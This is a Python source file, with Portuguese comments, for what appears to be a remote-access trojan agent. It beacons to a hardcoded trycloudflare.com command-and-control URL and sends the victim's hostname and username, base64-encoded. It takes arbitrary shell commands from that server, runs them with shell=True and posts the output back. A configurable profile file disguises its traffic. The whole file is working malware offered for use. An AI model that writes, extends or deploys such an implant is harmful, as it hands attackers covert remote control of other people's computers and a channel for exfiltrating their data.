import requests
import time
import subprocess
import json
import os
import base64 # +++ ADICIONADO

# --- CONFIGURAÇÃO ---
C2_URL = "https://arbitrary-summaries-shoulder-wu.trycloudflare.com"
AGENT_ID_FILE = "agent_id.dat"
PROFILE_FILE = "profile.json" # +++ ADICIONADO
AGENT_ID = None

# +++ ADICIONADO: Carregar o perfil
try:
    with open(PROFILE_FILE, 'r') as f:
        profile = json.load(f)
except FileNotFoundError:
    print(f"[-] Erro: Arquivo de perfil '{PROFILE_FILE}' não encontrado.")
    exit()

# (Funções de get/set ID permanecem iguais)
def get_agent_id():
    # ... (sem alterações)
    if os.path.exists(AGENT_ID_FILE):
        with open(AGENT_ID_FILE, 'r') as f:
            return f.read().strip()
    return None

def set_agent_id(new_id):
    # ... (sem alterações)
    with open(AGENT_ID_FILE, 'w') as f:
        f.write(new_id)

AGENT_ID = get_agent_id()

def send_beacon():
    """Envia o beacon para o C2 de acordo com o perfil de comunicação."""
    global AGENT_ID
    
    system_info = {
        "hostname": os.environ.get('COMPUTERNAME', 'Unknown'),
        "user": os.environ.get('USERNAME', 'Unknown'),
        "agent_id": AGENT_ID
    }
    
    # +++ MODIFICADO: A lógica de comunicação agora usa o perfil
    beacon_cfg = profile['beacon_config']
    headers = {'User-Agent': profile['user_agent']}
    beacon_url = f"{C2_URL}{beacon_cfg['uri']}"

    try:
        if beacon_cfg['method'] == 'GET':
            # Codifica os dados em base64 para colocar na URL
            encoded_info = base64.b64encode(json.dumps(system_info).encode()).decode()
            params = {beacon_cfg['data_param']: encoded_info}
            response = requests.get(beacon_url, headers=headers, params=params, timeout=10)
        else: # POST
            response = requests.post(beacon_url, headers=headers, json=system_info, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if AGENT_ID is None and 'agent_id' in data:
                AGENT_ID = data['agent_id']
                set_agent_id(AGENT_ID)
                print(f"[+] Registrado com sucesso. Meu ID é: {AGENT_ID}")
            
            if 'task' in data and data['task'] != 'none':
                execute_task(data['task'])

    except requests.exceptions.RequestException as e:
        print(f"[-] Erro de comunicação com o C2: {e}")

def send_results(task_id, output):
    """Envia o resultado de uma tarefa para o C2 de acordo com o perfil."""
    # +++ MODIFICADO: A lógica de comunicação agora usa o perfil
    results_cfg = profile['results_config']
    headers = {'User-Agent': profile['user_agent']}
    
    # Monta a URL dinâmica com o agent_id
    uri = results_cfg['uri'].replace('.json', f'/{AGENT_ID}.json')
    results_url = f"{C2_URL}{uri}"
    
    payload = {"task_id": task_id, "output": output}
    try:
        requests.post(results_url, headers=headers, json=payload, timeout=10)
        print(f"[+] Resultado da tarefa {task_id} enviado.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Erro ao enviar resultado: {e}")

# (funções execute_task e main_loop permanecem iguais)
def execute_task(task):
    # ... (sem alterações)
    task_id = task.get('task_id')
    command = task.get('command')
    print(f"[*] Recebi a tarefa {task_id}: Executar '{command}'")
    output = ""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
    except Exception as e:
        output = f"Erro ao executar o comando: {e}"
    send_results(task_id, output)

def main_loop():
    # ... (sem alterações)
    sleep_interval = 30
    while True:
        send_beacon()
        time.sleep(sleep_interval)

if __name__ == "__main__":
    main_loop()